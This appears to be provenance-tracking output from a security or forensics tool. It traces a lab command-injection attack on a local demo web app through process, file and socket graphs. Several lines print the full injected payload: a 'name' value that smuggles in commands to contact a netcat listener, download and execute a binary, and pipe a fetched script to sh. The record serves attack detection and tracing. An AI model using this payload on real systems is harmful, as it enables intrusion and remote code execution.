@@ -1,0 +1,59 @@
+processes naming port 4444 or called nc: 5
+  p:7316:1019558260522  comm='nc' exe='/usr/bin/nc' cmd='nc -l 127.0.0.1 4444'
+  p:7350:1025891707062  comm='python' exe='/home/ashu/p15venv/bin/python' cmd='/home/ashu/p15venv/bin/python -c import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1], safe="")) localhost;nc -w1 127.0.0.1 4444 </dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh'
+  p:7351:1025957713462  comm='curl' exe='/usr/bin/curl' cmd='curl -s http://127.0.0.1:8080/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%204444%20%3C%2Fdev%2Fnull%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fk%20-o%20%2Ftmp%2F.k%3Bchmod%20%2Bx%20%2Ftmp%2F.k%3B%2Ftmp%2F.k%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fs2%7Csh'
+  p:7352:1025969725064  comm='sh' exe='/bin/sh' cmd='/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 </dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh'
+  p:7354:1025980547918  comm='nc' exe='/usr/bin/nc' cmd='nc -w1 127.0.0.1 4444'
+
+tracking from p:7354:1025980547918 ('nc -w1 127.0.0.1 4444')
+
+===== --back p:7354:1025980547918 =====
+backward from node 172 at 1049482525290: 186 nodes, file 158, proc 19, sock 9
+         1049482525290        172  proc 7354 nc (nc -w1 127.0.0.1 4444)
+         1025983181529        883  file /etc/services
+         1025983057996        661  file /etc/ld.so.cache
+         1025983022483        806  file /etc/nsswitch.conf
+         1025982698429        669  file /usr/lib/x86_64-linux-gnu/libmd.so.0.1.0
+         1025982658416        660  file /usr/lib/x86_64-linux-gnu/libc.so.6
+         1025982617734        668  file /usr/lib/x86_64-linux-gnu/libresolv.so.2
+         1025982575557        667  file /usr/lib/x86_64-linux-gnu/libbsd.so.0.12.2
+         1025980848539        666  file /usr/bin/nc.openbsd
+         1025980757934        654  file /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+         1025980554259        170  proc 7352 sh (/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 </dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh)
+         1025980489927        211  file /dev/null
+         1025970796172        867  file /usr/bin/dash
+         1025969734636        139  proc 7320 python (/home/ashu/p15venv/bin/python tools/demo/webapp.py 8080)
+         1025968934490        962  sock 127.0.0.1:57084 -> 127.0.0.1:8080
+         1025968934490        963  sock 127.0.0.1:8080 -> 127.0.0.1:57084
+         1025968895391        169  proc 7351 curl (curl -s http://127.0.0.1:8080/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%204444%20%3C%2Fdev%2Fnull%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fk%20-o%20%2Ftmp%2F.k%3Bchmod%20%2Bx%20%2Ftmp%2F.k%3B%2Ftmp%2F.k%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fs2%7Csh)
+         1025967371744        850  file /etc/passwd
+         1025967031050        662  file /usr/lib/locale/locale-archive
+         1025966872018        849  file /etc/ssl/openssl.cnf
+         1025965863323        848  file /etc/gnutls/config
+         1025962100181        439  file /usr/lib/x86_64-linux-gnu/libffi.so.8.2.0
+         1025962040312        847  file /usr/lib/x86_64-linux-gnu/libkeyutils.so.1.10
+         1025962005257        846  file /usr/lib/x86_64-linux-gnu/libtasn1.so.6.6.5
+         1025961961096        845  file /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.4.8
+         1025961928427        844  file /usr/lib/x86_64-linux-gnu/libbrotlicommon.so.1.2.0
+         1025961887194        843  file /usr/lib/x86_64-linux-gnu/libkrb5support.so.0.1
+         1025961526598        842  file /usr/lib/x86_64-linux-gnu/libcom_err.so.2.1
+         1025961498252        841  file /usr/lib/x86_64-linux-gnu/libk5crypto.so.3.1
+         1025961466473        840  file /usr/lib/x86_64-linux-gnu/libkrb5.so.3.3
+         1025961434241        839  file /usr/lib/x86_64-linux-gnu/libsasl2.so.2.0.25
+         1025961407719        838  file /usr/lib/x86_64-linux-gnu/libgmp.so.10.5.0
+         1025961381519        837  file /usr/lib/x86_64-linux-gnu/libnettle.so.8.11
+         1025961356184        836  file /usr/lib/x86_64-linux-gnu/libhogweed.so.6.11
+         1025961309280        835  file /usr/lib/x86_64-linux-gnu/libgnutls.so.30.41.1
+         1025961279982        834  file /usr/lib/x86_64-linux-gnu/libunistring.so.5.2.0
+         1025961248229        833  file /usr/lib/x86_64-linux-gnu/libbrotlidec.so.1.2.0
+         1025961217506        774  file /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7
+         1025961181653        832  file /usr/lib/x86_64-linux-gnu/libgssapi_krb5.so.2.2
+         1025961139554        773  file /usr/lib/x86_64-linux-gnu/libcrypto.so.3
+  ... 146 more (--top)
+
+===== --forward p:7354:1025980547918 =====
+forward from node 172 at 1019419338401: 4 nodes, proc 2, sock 2
+         1019419338401        172  proc 7354 nc (nc -w1 127.0.0.1 4444)
+         1025983297211        965  sock 127.0.0.1:57868 -> 127.0.0.1:4444
+         1025983297211        966  sock 127.0.0.1:4444 -> 127.0.0.1:57868
+         1025983344177        135  proc 7316 nc (nc -l 127.0.0.1 4444)
